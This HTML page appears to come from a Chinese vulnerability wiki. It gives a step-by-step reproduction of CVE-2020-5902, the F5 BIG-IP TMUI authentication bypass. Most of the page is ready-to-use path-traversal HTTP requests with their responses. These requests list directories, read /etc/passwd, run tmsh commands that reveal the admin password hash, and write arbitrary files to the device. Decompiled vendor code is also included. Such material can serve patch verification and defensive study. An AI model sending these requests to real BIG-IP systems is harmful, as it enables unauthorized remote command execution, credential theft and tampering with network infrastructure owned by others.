<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/%EF%BC%88CVE-2020-5902%EF%BC%89F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-5902\uff09F5 BIG-IP \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../F5-BIG-IP/F5%20BIG-IP%20iControl%20REST%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-1388/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../F5-BIG-IP/F5%20BIG-IP%20iControl%20REST%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-1388/" class="btn btn-xs btn-link">
        F5 BIG-IP iControl REST身份认证绕过漏洞 CVE-2022-1388
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-link">
        (CVE-2021-22986) F5 BIG-IP iControl RCE
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-5902f5-big-ip">（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞<a class="headerlink" href="#cve-2020-5902f5-big-ip" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>本次漏洞位于F5
BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>BIG-IP 15.x: 15.1.0/15.0.0BIG-IP 14.x: 14.1.0 ~ 14.1.2BIG-IP 13.x: 13.1.0 ~ 13.1.3BIG-IP 12.x: 12.1.0 ~ 12.1.5BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">列当前文件<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code>/tmui/locallb/workspace/directoryList.jsp
</code></pre></div>

<p>Example:</p>
<div class="codehilite"><pre><span></span><code>directoryPath=/usr/local/www/
</code></pre></div>

<p>1.png</p>
<h4 id="burpsuite-request">BurpSuite Request<a class="headerlink" href="#burpsuite-request" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</code></pre></div>

<h4 id="burpsuite-response">BurpSuite Response<a class="headerlink" href="#burpsuite-response" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>      {
        &quot;dir&quot;: &quot;tmui&quot;,
        &quot;children&quot;: [
          {
            &quot;dir&quot;: &quot;WEB-INF&quot;,
            &quot;children&quot;: [
              {
                &quot;dir&quot;: &quot;classes&quot;,
                &quot;children&quot;: [
                  {
                    &quot;dir&quot;: &quot;org&quot;,
                    &quot;children&quot;: [
                      {
                        &quot;dir&quot;: &quot;apache&quot;,
                        &quot;children&quot;: [
                          {
                            &quot;dir&quot;: &quot;jsp&quot;,
                            &quot;children&quot;: [
                              {
                                &quot;dir&quot;: &quot;common&quot;,
                                &quot;children&quot;: [
                                  {
                                    &quot;file&quot;: &quot;deleteconfirm_jsp.class&quot;

                                      ............................
</code></pre></div>

<h3 id="_5">读取当前文件<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>Example:</p>
<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="nv">tmui</span><span class="o">/</span><span class="nv">locallb</span><span class="o">/</span><span class="nv">workspace</span><span class="o">/</span><span class="k">fileRead</span>.<span class="nv">jsp</span>?<span class="nv">fileName</span><span class="o">=/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span>
</code></pre></div>

<p>2.png</p>
<h4 id="burpsuite-requests">BurpSuite Requests<a class="headerlink" href="#burpsuite-requests" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</code></pre></div>

<h4 id="burpsuite-response_1">BurpSuite Response<a class="headerlink" href="#burpsuite-response_1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;root:x:0:0:root:/root:/bin/bash</span><span class="se">\n</span><span class="s2">bin:x:1:1:bin:/bin:/sbin/nologin</span><span class="se">\n</span><span class="s2">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><span class="se">\n</span><span class="s2">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><span class="se">\n</span><span class="s2">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><span class="se">\n</span><span class="s2">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><span class="se">\n</span><span class="s2">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><span class="se">\n</span><span class="s2">operator:x:11:0:operator:/root:/sbin/nologin</span><span class="se">\n</span><span class="s2">nobody:x:99:99:Nobody:/:/sbin/nologin</span><span class="se">\n</span><span class="s2">tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin</span><span class="se">\n</span><span class="s2">admin:x:0:500:Admin User:/home/admin:/sbin/nologin</span><span class="se">\n</span><span class="s2">vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin</span><span class="se">\n</span><span class="s2">dbus:x:81:81:System message bus:/:/sbin/nologin</span><span class="se">\n</span><span class="s2">postgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin</span><span class="se">\n</span><span class="s2">f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin</span><span class="se">\n</span><span class="s2">oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin</span><span class="se">\n</span><span class="s2">tcpdump:x:72:72::/:/sbin/nologin</span><span class="se">\n</span><span class="s2">rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin</span><span class="se">\n</span><span class="s2">hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin</span><span class="se">\n</span><span class="s2">apache:x:48:48:Apache:/usr/local/www:/sbin/nologin</span><span class="se">\n</span><span class="s2">tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin</span><span class="se">\n</span><span class="s2">mysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin</span><span class="se">\n</span><span class="s2">named:x:25:25:Named:/var/named:/bin/false</span><span class="se">\n</span><span class="s2">qemu:x:107:107:qemu user:/:/sbin/nologin</span><span class="se">\n</span><span class="s2">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><span class="se">\n</span><span class="s2">sdm:x:498:495:sdmuser:/var/sdm:/bin/false</span><span class="se">\n</span><span class="s2">ntp:x:38:38::/etc/ntp:/sbin/nologin</span><span class="se">\n</span><span class="s2">syscheck:x:199:10::/:/sbin/nologin</span><span class="se">\n</span><span class="s2">restnoded:x:198:198::/:/sbin/nologin</span><span class="se">\n</span><span class="s2">twister5:x:0:500:twister5:/home/twister5:/bin/bash</span><span class="se">\n</span><span class="s2">&quot;</span>
<span class="p">}</span>
</code></pre></div>

<h4 id="format">format<a class="headerlink" href="#format" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="n">root</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="n">root</span><span class="o">:/</span><span class="n">root</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">bin</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="n">bin</span><span class="o">:/</span><span class="n">bin</span><span class="o">:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">daemon</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="n">daemon</span><span class="o">:/</span><span class="n">sbin</span><span class="o">:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">adm</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="n">adm</span><span class="o">:/</span><span class="n">var</span><span class="sr">/adm:/sbin/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="n">lp</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/lpd:/sbin/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="n">mail</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/mail:/sbin/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="n">uucp</span><span class="o">:/</span><span class="n">var</span><span class="sr">/spool/uucp:/sbin/</span><span class="n">nologin</span>
<span class="n">operator</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="n">operator</span><span class="o">:/</span><span class="n">root</span><span class="o">:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">99</span><span class="o">:</span><span class="mi">99</span><span class="o">:</span><span class="n">Nobody</span><span class="o">:/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tmshnobody</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">32765</span><span class="o">:</span><span class="mi">32765</span><span class="o">:</span><span class="n">tmshnobody</span><span class="o">:/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">admin</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">500</span><span class="o">:</span><span class="n">Admin</span><span class="w"> </span><span class="n">User</span><span class="o">:/</span><span class="n">home</span><span class="sr">/admin:/sbin/</span><span class="n">nologin</span>
<span class="n">vcsa</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">69</span><span class="o">:</span><span class="mi">69</span><span class="o">:</span><span class="n">virtual</span><span class="w"> </span><span class="n">console</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">owner</span><span class="o">:/</span><span class="n">dev</span><span class="o">:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">dbus</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">81</span><span class="o">:</span><span class="mi">81</span><span class="o">:</span><span class="n">System</span><span class="w"> </span><span class="n">message</span><span class="w"> </span><span class="n">bus</span><span class="o">:/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">postgres</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="mi">26</span><span class="o">:</span><span class="n">PostgreSQL</span><span class="w"> </span><span class="n">Server</span><span class="o">:/</span><span class="n">var</span><span class="sr">/local/pgsql/data:/sbin/</span><span class="n">nologin</span>
<span class="n">f5_remoteuser</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">499</span><span class="o">:</span><span class="mi">499</span><span class="o">:</span><span class="n">f5</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">account</span><span class="o">:/</span><span class="n">home</span><span class="sr">/f5_remoteuser:/sbin/</span><span class="n">nologin</span>
<span class="n">oprofile</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="mi">16</span><span class="o">:</span><span class="n">Special</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">OProfile</span><span class="o">:/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">tcpdump</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">72</span><span class="o">:</span><span class="mi">72</span><span class="o">::/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">rpc</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="n">Rpcbind</span><span class="w"> </span><span class="n">Daemon</span><span class="o">:/</span><span class="n">var</span><span class="sr">/cache/rpcbind:/sbin/</span><span class="n">nologin</span>
<span class="n">hsqldb</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">96</span><span class="o">:</span><span class="mi">96</span><span class="o">::/</span><span class="n">var</span><span class="sr">/lib/hsqldb:/sbin/</span><span class="n">nologin</span>
<span class="n">apache</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="mi">48</span><span class="o">:</span><span class="n">Apache</span><span class="o">:/</span><span class="n">usr</span><span class="sr">/local/www:/sbin/</span><span class="n">nologin</span>
<span class="n">tomcat</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">91</span><span class="o">:</span><span class="mi">91</span><span class="o">:</span><span class="n">Apache</span><span class="w"> </span><span class="n">Tomcat</span><span class="o">:/</span><span class="n">usr</span><span class="sr">/share/tomcat:/sbin/</span><span class="n">nologin</span>
<span class="n">mysql</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="n">MySQL</span><span class="w"> </span><span class="n">server</span><span class="o">:/</span><span class="n">var</span><span class="sr">/lib/mysql:/sbin/</span><span class="n">nologin</span>
<span class="n">named</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="n">Named</span><span class="o">:/</span><span class="n">var</span><span class="sr">/named:/bin/</span><span class="kc">false</span>
<span class="n">qemu</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">107</span><span class="o">:</span><span class="mi">107</span><span class="o">:</span><span class="n">qemu</span><span class="w"> </span><span class="n">user</span><span class="o">:/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sshd</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="n">Privilege</span><span class="o">-</span><span class="n">separated</span><span class="w"> </span><span class="n">SSH</span><span class="o">:/</span><span class="n">var</span><span class="sr">/empty/sshd:/sbin/</span><span class="n">nologin</span>
<span class="n">sdm</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">498</span><span class="o">:</span><span class="mi">495</span><span class="o">:</span><span class="n">sdmuser</span><span class="o">:/</span><span class="n">var</span><span class="sr">/sdm:/bin/</span><span class="kc">false</span>
<span class="n">ntp</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">38</span><span class="o">::/</span><span class="n">etc</span><span class="sr">/ntp:/sbin/</span><span class="n">nologin</span>
<span class="n">syscheck</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">199</span><span class="o">:</span><span class="mi">10</span><span class="o">::/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">restnoded</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">198</span><span class="o">:</span><span class="mi">198</span><span class="o">::/:/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">twister5</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">500</span><span class="o">:</span><span class="n">twister5</span><span class="o">:/</span><span class="n">home</span><span class="sr">/twister5:/bin/</span><span class="n">bash</span>
</code></pre></div>

<h3 id="_6">远程命令执行<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>Example:</p>
<div class="codehilite"><pre><span></span><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
</code></pre></div>

<p><code>list auth user</code> look all user</p>
<p><code>list auth user admin</code> only look admin user</p>
<p><a href="https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions3.png">https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions3.png</a></p>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="err">{</span>
  &quot;error&quot;: &quot;&quot;,
  &quot;output&quot;: &quot;auth user admin {\n    description \&quot;Admin User\&quot;\n    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1\n    partition Common\n    partition-access {\n        all-partitions {\n            role admin\n        }\n    }\n    shell tmsh\n}\n&quot;
}
</code></pre></div>

<h4 id="format_1">format<a class="headerlink" href="#format_1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>    description &quot;Admin User&quot;
    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1
    partition Common
    partition-access {
        all-partitions {
            role admin
        }
    }
    shell tmsh
}
</code></pre></div>

<h4 id="workspaceutilsruntmshcommand">WorkspaceUtils.runTmshCommand<a class="headerlink" href="#workspaceutilsruntmshcommand" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);
/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand
  public static JSONObject runTmshCommand(String command, HttpServletRequest request) {
    F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);
    JSONObject resultObject = new JSONObject();
    String output = &quot;&quot;;
    String error = &quot;&quot;;
    if (!csrfValidated(request.getHeader(&quot;_bufvalue&quot;), request.getHeader(&quot;_timenow&quot;), request.getHeader(&quot;Tmui-Dubbuf&quot;))) {
      logger.warn(&quot;Invalid user token - token provided by user is not authorized&quot;);
      resultObject.put(&quot;output&quot;, output);
      resultObject.put(&quot;error&quot;, NLSEngine.getString(&quot;ilx.workspace.error.InvalidUserToken&quot;));
      return resultObject;
    } 
    if (&quot;POST&quot;.equalsIgnoreCase(request.getMethod())) {
      String[] cmdArray = command.split(&quot; &quot;);
      String operation = cmdArray[0];
      String module = cmdArray[2];
      if (!ShellCommandValidator.checkForBadShellCharacters(command) &amp;&amp; (operation.equals(&quot;create&quot;) || operation.equals(&quot;delete&quot;) || operation.equals(&quot;list&quot;) || operation.equals(&quot;modify&quot;)) &amp;&amp; WHITELISTED_TMSH_MODULES.contains(module)) {
        try {
          String[] args = { command };
          Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);
          output = result.getOutput();
          error = result.getError();
        } catch (com.f5.tmui.util.Syscall.CallException e) {
          logger.error(NLSEngine.getString(&quot;ilx.workspace.error.TmshCommandFailed&quot;) + &quot;: &quot; + e.getMessage());
          error = e.getMessage();
        } 
      } else {
        error = NLSEngine.getString(&quot;ilx.workspace.error.RejectedTmshCommand&quot;);
      } 
    } else {
      error = NLSEngine.getString(&quot;ilx.workspace.error.InvalidMethod&quot;);
    } 
    resultObject.put(&quot;output&quot;, output);
    resultObject.put(&quot;error&quot;, error);
    return resultObject;
  }
</code></pre></div>

<h3 id="_7">文件上传<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>Example: <code>/tmui/locallb/workspace/fileSave.jsp</code></p>
<p>POST: <code>fileName=/tmp/1.txt&amp;content=CVE-2020-5902</code></p>
<p>4.png</p>
<h4 id="burpsuite-requests_1">Burpsuite Requests<a class="headerlink" href="#burpsuite-requests_1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">41</span>

<span class="nt">fileName</span><span class="o">=</span><span class="s">/tmp/1.txt</span><span class="p">&amp;</span><span class="nt">content</span><span class="o">=</span><span class="s">CVE-2020-5902</span>



<span class="s">HTTP/1.1 200 OK</span>
<span class="s">Date: Mon, 06 Jul 2020 02:05:29 GMT</span>
<span class="s">X-Frame-Options: SAMEORIGIN</span>
<span class="s">Strict-Transport-Security: max-age</span><span class="o">=</span><span class="s">16070400; includeSubDomains</span>
<span class="s">Set-Cookie: JSESSIONID</span><span class="o">=</span><span class="s">x; Path</span><span class="o">=</span><span class="s">/tmui; Secure; HttpOnly</span>
<span class="s">Content-Type: text/html;charset</span><span class="o">=</span><span class="s">ISO-8859-1</span>
<span class="s">X-Content-Type-Options: nosniff</span>
<span class="s">X-XSS-Protection: 1; mode</span><span class="o">=</span><span class="s">block</span>
<span class="s">Content-Security-Policy: default-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data:  http://127.4.1.1 http://127.4.2.1</span>
<span class="s">Vary: Accept-Encoding</span>
<span class="s">Content-Length: 4</span>
<span class="s">Connection: close</span>
</code></pre></div>

<h4 id="file-read-tmp1txt">File Read /tmp/1.txt<a class="headerlink" href="#file-read-tmp1txt" title="Permanent link">&para;</a></h4>
<p>5.png</p>
<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="err">HTTP/1.1</span> <span class="l">200 OK</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Mon, 06 Jul 2020 02:06:07 GMT</span>
